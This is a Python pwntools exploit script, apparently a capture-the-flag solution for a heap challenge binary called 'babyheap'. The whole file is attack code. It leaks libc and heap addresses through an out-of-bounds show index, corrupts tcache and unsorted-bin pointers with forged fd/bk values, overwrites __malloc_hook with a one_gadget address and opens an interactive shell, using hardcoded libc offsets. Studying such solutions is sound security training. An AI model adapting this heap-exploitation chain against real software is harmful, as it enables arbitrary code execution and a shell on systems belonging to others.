#! /usr/bin/python
#-*- coding: utf-8 -*-
from pwn import *
 
context.terminal = ['tmux', 'splitw', '-h']
context(arch = 'amd64' , os = 'linux', log_level='debug')

p = process('./babyheap')

'''
1.add
2.show
3.edit
4.del
5.exit
'''

def add():
  p.sendlineafter('>>', '1')

def delete(idx):
  p.sendlineafter('>>', '4')
  p.sendlineafter('index?', str(idx))

def show(idx):
  p.sendlineafter('>>', '2')
  p.sendlineafter('index?', str(idx))

def edit(idx, size, payload):
  p.sendlineafter('>>', '3')
  p.sendlineafter('index?', str(idx))
  p.sendlineafter('Size:', str(size))
  p.sendafter('Content:', payload)
 
if __name__ == "__main__":
  show(-14)
  libc = u64(p.recvuntil('\x7f')[-6:].ljust(8, '\x00')) - 0x3ec760
  success('LEAK:\t' + str(hex(libc)))
  __malloc_hook = libc + 0x3ebc30

  sh = libc + 0x1b3e9a
  _IO_str_jumps = libc + 0x3e8360
  system = libc + 0x04f440

  for i in range(13):
    add()

  for i in range(11):
    delete(i)
  
  for i in range(11):
    add()

  for i in range(6):
    delete(i)
  delete(11)

  add()
  show(0)
  p.recvuntil('\n')
  heap = u64(p.recvuntil('\n')[:-1].ljust(8, '\x00'))
  success('LEAK:\t' + str(hex(heap)))
  delete(0)

  target = heap + 0x5f0
  ptr = heap + 0xb00
  edit(12,0x8, p64(target))
  edit(7, 0x10, p64(ptr - 3 * 0x8) + p64(ptr - 2 * 0x8))
  edit(9, 0xf8, 'mech0n\n')
  delete(10)

  for i in range(8):    # 7 == 11
    add()

  delete(7)
  edit(11, 0x10, p64(__malloc_hook))

  og = [0x4f2c5, 0x4f322, 0x10a38c]
  add()
  add()
  edit(13, 0x8, p64(og[2] + libc))

  add()
  success('LEAK:\t' + str(hex(heap)))
  success('LEAK:\t' + str(hex(libc)))


  # gdb.attach(p)
  p.interactive()